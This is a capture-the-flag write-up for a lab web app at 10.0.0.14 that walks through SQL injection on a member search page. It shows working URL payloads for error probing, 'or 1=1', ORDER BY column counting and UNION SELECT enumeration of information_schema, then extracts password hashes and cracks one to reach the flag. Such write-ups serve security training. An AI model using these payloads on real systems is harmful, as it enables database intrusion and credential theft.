**10.0.0.14/?page=member**

A simple SQL injection will not work here.

Testing the page's function to search for user function.
This makes a search for a user by id and then returns a result.
The SQL query probably makes a search to a single column (id column).

An input of a single quote ' returns an error message that there is a SQL syntax error.
_http://10.0.0.14/index.php?page=member&id=%27&Submit=Submit#_
From this, an attacker will be able to see that the application use MySQL and is vulnerable to SQL injections.

The application does not respond to *1 ' or 1=1--*. *1 or 1=1--* works. This will return all users from the database.
This application just searches for users in a database and not log into any account.

No flag has beeen returned...
We will go further.
The ORDER command will be used to find the number of columns that are present in the current table.
The limit is 2 columns as an error is brought up when 3 is used.
_http://10.0.0.14/index.php?page=member&id=1+ORDER+BY+3--&Submit=Submit#_

Now find the datatypes used for each column by using the UNION SELECT command and the NULL keyword in combination.
_http://10.0.0.14/index.php?page=member&id=1+UNION+SELECT+NULL%2C+NULL--&Submit=Submit#_
_http://10.0.0.14/index.php?page=member&id=1+UNION+SELECT+123%2C+321--&Submit=Submit#_
The datatypes returned are both integer.

Since MYSQL is used, information\_schema.tables and table\_schema will be used to get database information.
_1 union select null, table_name from information_schema.tables where table_schema = database()--_
We now have the name of the table, users (This is selected from the current database with the help of *database()*).
_1 union select null, column_name from information_schema.columns where table_schema = database()--_
This gives us all the columns present in the table users.

There appears to be columns called comment (Commentaire), and countersign (password).
These columns can be searched as it seems to stand out. The others are just dealing with place name and names of people.
Search both at the same time with the following:
_1 union select null, concat(Commentaire, countersign) from users--_
*concat()* is MySQL's concatenation function. Piping will not work for concatenation here.

Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
We get FortyTwo
Change it to fortytwo.
Lastly we get:
**FLAG:
10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5**

https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html
https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/

*The hackbar firefox extension can be used for this but avoid tools.*
